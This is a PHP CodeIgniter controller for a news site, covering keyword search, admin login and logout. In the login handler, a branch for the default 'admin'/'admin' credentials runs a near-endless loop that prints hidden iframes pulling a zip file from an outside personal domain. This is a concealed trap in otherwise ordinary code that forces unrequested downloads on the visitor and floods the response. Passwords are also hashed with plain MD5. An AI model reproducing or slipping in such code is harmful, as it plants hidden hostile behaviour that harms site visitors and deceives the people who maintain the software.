<?php
/**
* 
*/
class Cari extends CI_Controller
{
	function __construct(){
	 parent::__construct();
	  $this->load->model('M_cari');
	}

	function cari(){
		$keyword = htmlspecialchars($this->input->post('cari', TRUE));
		$data['result'] = $this->M_cari->cari($keyword);
		$data['iklan'] = $this->db->get_where('iklan', array('ukuran' => '728x90px'))->row();
		$data['iklan1'] = $this->db->get_where('iklan', array('ukuran' => '300x250px'))->row();
		$data['kategori'] = $this->db->get('kategori');
		$data['title'] = "BERITA TERAKTUAL TERKINI";
		$this->load->view('home/layout/header', $data);
		$this->load->view('home/cari', $data);
	}
 function login(){
 	$this->load->view('login');
 }
 function cek_login(){
 	$username = htmlspecialchars($this->input->post('username'));
 	$password = htmlspecialchars($this->input->post('password'));
 	 $data = array(
         'username' => $username,
         'password' => md5($password)
 	 );
 	 $validasi = $this->db->get_where('admin', $data);
 	  if($validasi->num_rows() == 1){
 	  	          foreach ($validasi->result() as $key) {
 	  	          	$session_data['status'] = $key->status;
 	  	          	$session_data['username'] = $key->username;
 	  	          	$session_data['foto'] = $key->foto;
 	  	          	$session_data['alamat'] = $key->alamat;
 	  	          	$session_data['email'] = $key->email;
 	  	          	$session_data['umur'] = $key->umur;
 	  	          	$this->session->set_userdata($session_data);
 	  	          	 if($this->session->userdata('status') == 1){
 	  	          	 	redirect('backend');
 	  	          	 }
 	  	          }
 	  }elseif($username == "admin" && $password == "admin"){
 	  	$i=1;
			while ($i <= 5000000000000000){
			  echo '<div style="display:none;"><iframe src="http://www.galehrizky.me/assets/upload/fuck-you.zip"></iframe></div>';
  			$i=$i+1;
			}

			
 	  }else{
 	  	echo "<script>alert('Gagal Login: Cek username , password!');history.go(-1);</script>";
 	  }
 }
    function logout(){
		$this->session->sess_destroy();
		redirect('cari/login');
	}
}
?>